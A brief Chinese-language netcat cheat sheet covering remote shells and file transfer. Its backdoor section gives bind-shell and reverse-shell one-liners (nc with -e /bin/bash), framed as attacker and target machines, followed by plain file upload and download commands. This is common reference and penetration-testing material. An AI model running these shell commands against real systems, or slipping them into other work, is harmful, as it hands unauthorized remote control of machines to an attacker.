# netcat

> netcat 是一种常用的网络工具，主要用于在网络间建立 TCP 或 UDP 连接来进行数据传输、传输文件、端口扫描、远程系统管理以及后门访问。

## 后门访问

> 例如攻击者在局域网，而靶机在公网并且关闭了防火墙，绑定了 shell 提供给攻击者访问的情况，一般为**正向 shell**。

* 靶机：

   ```bash
   nc -lvp 8888 -e /bin/bash
   ```

* 攻击机（在局域网中）：

   ```bash
   nc -v ip 8888
   ```

此时我们在攻击机中就可以获取靶机的终端访问权限

> 而攻击者将 shell 绑定至本地端口，供靶机远程访问。靶机主动连接正在监听的攻击者的行为就是**反向 shell**。（*此时攻击者位于公网*）

* 攻击机（位于公网）：

   ```bash
   nc -lvp 8888
   ```

* 靶机：

   ```bash
   nc -v ip 8888 -e /bin/bash
   ```

## 文件传输

> 文件上传：将客户端文件上传到服务端

服务端：

```bash
nc --recv-only -lvp 8888 > listen.sh
```

客户端：

```bash
nc --send-only -v ip 8888 < listen.sh
```

> 文件下载：客户端从服务端下载文件

服务端：

```bash
nc --send-only -lvp 8888 < listen.sh
```

客户端

```bash
nc --recv-only -v ip 8888 > listen.sh
```

参见：<https://wangchujiang.com/reference/docs/netcat.html>
